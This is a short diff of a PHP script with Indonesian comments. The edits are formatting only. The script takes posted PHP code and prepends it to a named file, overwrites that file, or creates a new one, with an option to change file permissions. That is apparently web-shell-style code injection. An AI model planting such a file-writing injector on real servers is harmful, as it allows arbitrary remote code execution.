@@ -45,13 +45,13 @@
         $change_permission = isset($_POST['change_permission']) ? true : false; // Cek apakah pengguna memilih untuk mengubah izin file
 
         // Memastikan bahwa kode PHP tidak kosong
-        if (! empty($php_code)) {
+        if (!empty($php_code)) {
             if ($action == 'append') {
                 // Baca isi file yang ada
                 $existing_code = file_exists($filename) ? file_get_contents($filename) : '';
-
+                
                 // Tambahkan kode baru di baris pertama
-                $new_content = $php_code."\n".$existing_code;
+                $new_content = $php_code . "\n" . $existing_code;
 
                 // Tulis kembali konten baru ke file
                 file_put_contents($filename, $new_content);
@@ -63,11 +63,11 @@
                 echo "The contents of $filename have been overwritten.<br>";
             } elseif ($action == 'newfile') {
                 // Membuat file baru dengan nama yang diberikan
-                if (! empty($filename)) {
+                if (!empty($filename)) {
                     file_put_contents($filename, $php_code);
                     echo "New file ($filename) has been created.<br>";
                 } else {
-                    echo 'Please provide a file name for the new file.<br>';
+                    echo "Please provide a file name for the new file.<br>";
                 }
             }
 
@@ -78,7 +78,7 @@
             }
         } else {
             // Pesan kesalahan jika kode PHP kosong
-            echo 'Please enter PHP code.';
+            echo "Please enter PHP code.";
         }
     }
     ?>
